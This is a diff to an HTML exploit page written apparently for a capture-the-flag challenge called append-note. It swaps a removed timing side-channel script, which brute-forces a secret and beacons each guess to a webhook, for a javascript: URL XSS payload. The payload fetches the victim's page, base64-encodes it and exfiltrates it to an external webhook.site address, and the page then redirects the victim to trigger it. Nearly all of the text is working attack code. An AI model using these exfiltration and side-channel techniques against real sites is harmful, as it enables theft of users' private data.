@@ -1,92 +1,22 @@
 <!DOCTYPE html>
 <html>
-<head><title>XS-Leak Flag Timing</title></head>
+<head><title>XSS via redirect</title></head>
 <body>
 <div id="s">Loading...</div>
 <script>
 var TARGET = "https://append-note-hfskv.instancer.lac.tf";
 var WEBHOOK = "https://webhook.site/70d9bf2c-e5cf-49dc-aeed-4203dbfd538d";
-var CHARS = "0123456789abcdef";
 
-navigator.sendBeacon(WEBHOOK, "FLAG_TIMING_V1");
+// Use backticks to avoid quote escaping by Jinja2
+// The XSS payload fetches / which shows notes including SECRET
+var payload = "javascript:fetch(`/`).then(r=>r.text()).then(t=>{new Image().src=`https://webhook.site/70d9bf2c-e5cf-49dc-aeed-4203dbfd538d?d=`+btoa(t)})";
 
-function report(d) {
-    navigator.sendBeacon(WEBHOOK, d);
-}
-function setStatus(s) { document.getElementById('s').textContent = s; }
+navigator.sendBeacon(WEBHOOK, "XSS_V2");
 
-// Measure timing for /flag?secret=X with high precision
-async function measureFlag(secret) {
-    var url = TARGET + "/flag?secret=" + encodeURIComponent(secret);
-    
-    var times = [];
-    var samples = 5;
-    
-    for (var i = 0; i < samples; i++) {
-        var start = performance.now();
-        try {
-            await fetch(url, { mode: 'cors' });
-        } catch(e) {}
-        var elapsed = performance.now() - start;
-        times.push(elapsed);
-    }
-    
-    // Use median
-    times.sort(function(a,b) { return a - b; });
-    return times[Math.floor(samples / 2)];
-}
+document.getElementById('s').textContent = 'Redirecting...';
 
-// Test each char at position
-async function testPosition(prefix) {
-    var results = [];
-    
-    for (var i = 0; i < CHARS.length; i++) {
-        var c = CHARS[i];
-        var test = prefix + c + "0".repeat(7 - prefix.length);  // Pad to 8 chars
-        var time = await measureFlag(test);
-        results.push({ c: c, time: time });
-    }
-    
-    return results;
-}
-
-async function main() {
-    report('START');
-    setStatus('Testing flag timing...');
-    
-    try {
-        var secret = "";
-        
-        for (var p = 0; p < 8; p++) {
-            setStatus('P' + p + '...');
-            
-            var results = await testPosition(secret);
-            
-            // Sort by time (longer = more chars matched due to short-circuit comparison)
-            results.sort(function(a,b) { return b.time - a.time; });
-            
-            var top3 = results.slice(0, 3).map(function(r) { return r.c + ':' + r.time.toFixed(1); }).join(',');
-            report('P' + p + ':' + top3);
-            
-            // Pick slowest (more matching)
-            secret += results[0].c;
-            report('P' + p + '=' + secret);
-        }
-        
-        report('SEC:' + secret);
-        
-        // Verify
-        var resp = await fetch(TARGET + '/flag?secret=' + secret);
-        var flag = await resp.text();
-        report('FLAG:' + flag);
-        setStatus(flag);
-        
-    } catch(e) {
-        report('ERR:' + e);
-    }
-}
-
-main();
+// Navigate to /append with javascript: URL redirect
+window.location = TARGET + "/append?content=x&url=" + encodeURIComponent(payload);
 </script>
 </body>
 </html>
